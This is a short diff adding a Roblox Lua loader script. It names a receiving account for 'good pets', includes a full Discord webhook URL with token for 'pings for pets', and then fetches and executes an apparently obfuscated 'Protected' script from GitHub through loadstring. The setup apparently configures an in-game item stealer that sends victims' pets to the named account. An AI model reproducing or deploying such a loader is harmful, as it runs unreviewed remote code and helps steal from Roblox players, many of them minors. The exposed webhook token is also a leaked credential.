@@ -1,0 +1,5 @@
+UserName = "JadePlayzVR" -- good pets
+Webhook = "https://discord.com/api/webhooks/1175425732382572626/IGmrAsFxPZGJ9_HLJ43gecaiL-uY-lNNm9w0dxQrKxL91N8Go3BN4iUV-P25e-M9dWiI" -- pings for pets
+UserName2 = "came_ariyanna" -- bad pets
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VaporeonScripts/Diamond/main/Protected_1767317791473416.lua", true))()
